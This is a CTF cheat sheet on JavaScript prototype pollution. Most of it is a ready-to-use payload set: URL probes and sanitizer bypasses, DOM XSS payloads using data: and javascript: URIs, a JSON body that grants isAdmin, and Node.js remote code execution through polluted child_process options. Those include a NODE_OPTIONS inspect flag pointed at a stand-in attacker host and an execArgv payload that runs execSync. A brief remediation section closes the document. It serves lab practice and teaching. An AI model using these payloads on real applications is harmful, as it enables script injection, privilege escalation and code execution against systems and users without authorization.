# Prototype Pollution — CTF Cheat Sheet

**Tools:** Burp Suite Community / Professional, DOM Invader, browser DevTools  
**Practice:** PortSwigger Web Security Academy  
**Scope:** Authorized CTFs and lab environments only

---

## 1. CTF Methodology

Prototype Pollution occurs in JavaScript runtimes when an attacker can inject properties into the global `Object.prototype`, which are then inherited by all JavaScript objects throughout the application.

```
Identify Pollution Source
  ├── Query Parameters / Fragment (Client): ?__proto__[prop]=val
  └── JSON Body (Server Node.js): {"__proto__": {"prop": "val"}}
          │
Test Pollution Canary
  ├── Object.prototype.polluted == "val"
  └── Burp DOM Invader automated canary detection
          │
Identify Execution Gadget
  ├── Client-side DOM Gadget: Sinks reading undefined properties (transport_url, src, innerHTML)
  └── Server-side Node.js Gadget: child_process.fork / exec options (NODE_OPTIONS, shell, execArgv)
          │
Exploitation
  ├── Client: Escalate to DOM XSS
  └── Server: Privilege Escalation (isAdmin=true) or Remote Code Execution (RCE)
```

---

## 2. Client-Side Prototype Pollution (DOM XSS)

### 1. Probing with DOM Invader
1. In Burp's browser, open DevTools (`F12`) → **DOM Invader** tab.
2. Enable **Prototype pollution**.
3. Browse the application: DOM Invader automatically fuzzes URL query strings and fragments, alerting when `Object.prototype` is polluted and highlighting gadgets leading to DOM XSS.

---

### 2. Manual Probing & Common Payloads

#### Standard Object Probe:
```text
https://TARGET.net/?__proto__[test]=polluted
https://TARGET.net/?__proto__.test=polluted
```
*Verify in DevTools Console:* `Object.prototype.test` returns `"polluted"`.

#### Bypassing Flawed Sanitizers (`__proto__` stripped):
If the sanitizer blacklists `__proto__`, access the prototype through the `constructor` property:
```text
https://TARGET.net/?constructor[prototype][test]=polluted
https://TARGET.net/?constructor.prototype.test=polluted
```

---

### 3. Exploiting DOM Gadgets for XSS
Search scripts for objects that reference properties without default initialization:

- **Gadget Example in Application:**
  ```javascript
  let config = {};
  let script = document.createElement('script');
  script.src = config.transport_url || '/resources/default.js';
  document.head.appendChild(script);
  ```
- **Exploitation via Data URI:**
  ```text
  https://TARGET.net/?__proto__[transport_url]=data:,alert(1);
  ```
- **Exploitation via JavaScript URI:**
  ```text
  https://TARGET.net/?__proto__[src]=javascript:alert(1)
  ```

---

## 3. Server-Side Prototype Pollution (Node.js)

### 1. Privilege Escalation (Object Property Injection)
When the backend uses recursive merge or clone operations (e.g. `lodash.merge`, object cloning) on JSON bodies:

```http
POST /my-account/change-address HTTP/2
Host: TARGET.net
Content-Type: application/json

{
    "address_line_1": "123 Street",
    "__proto__": {
        "isAdmin": true
    }
}
```
*Result:* Every subsequent user object in the Node.js runtime inherits `isAdmin: true`. Access `/admin` to verify administrative privileges.

---

### 2. Blind Server-Side Detection
If properties are not reflected, look for structural changes in server behavior:

#### Override JSON Spacing / Formatting:
```json
{
    "__proto__": {
        "json spaces": 10
    }
}
```
*Signal:* If subsequent JSON responses return indented with 10 spaces, pollution is confirmed.

#### Override HTTP Status Codes:
```json
{
    "__proto__": {
        "status": 510
    }
}
```
*Signal:* Unrelated endpoints begin returning HTTP status 510.

---

### 3. Remote Code Execution (RCE) via `child_process`
When Node.js invokes external processes (e.g., `child_process.fork()` or `child_process.spawn()`), options are passed as an object that inherits from `Object.prototype`.

#### Exploiting `shell` / `NODE_OPTIONS`:
Pollute environment variables to force Node.js to evaluate inline commands:

```json
POST /my-account/update HTTP/2
Content-Type: application/json

{
    "__proto__": {
        "shell": "node",
        "NODE_OPTIONS": "--inspect=attacker.com"
    }
}
```

#### Exploiting `execArgv` Array:
```json
{
    "__proto__": {
        "execArgv": [
            "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
        ]
    }
}
```
*Trigger:* Navigate to any feature that triggers a background process (e.g. maintenance task, export job, log rotate).

---

## 4. CTF Quick Reference

| Target | Vector | High-Yield Payload |
|---|---|---|
| **Client DOM** | Query param | `?__proto__[transport_url]=data:,alert(1);` |
| **Sanitizer Bypass** | Constructor | `?constructor[prototype][src]=data:,alert(1);` |
| **Server Admin** | JSON Body | `{"__proto__": {"isAdmin": true}}` |
| **Server RCE** | Child Process | `{"__proto__": {"execArgv": ["--eval=require('child_process').execSync('cmd')"]}}` |
| **Blind Node Detect**| Express setting | `{"__proto__": {"json spaces": 8}}` |

---

## 5. Remediation

- **Use Prototype-Less Objects:** Initialize objects with `Object.create(null)` so they do not inherit from `Object.prototype`.
- **Freeze the Prototype:** Execute `Object.freeze(Object.prototype)` during server/client startup to make prototype properties immutable.
- **Defend Object Keys:** Blacklist property keys `__proto__`, `constructor`, and `prototype` in all recursive merge and clone functions.
- **Use `Map` for Key-Value Storage:** Prefer modern JavaScript `Map` collections over raw object dictionaries.
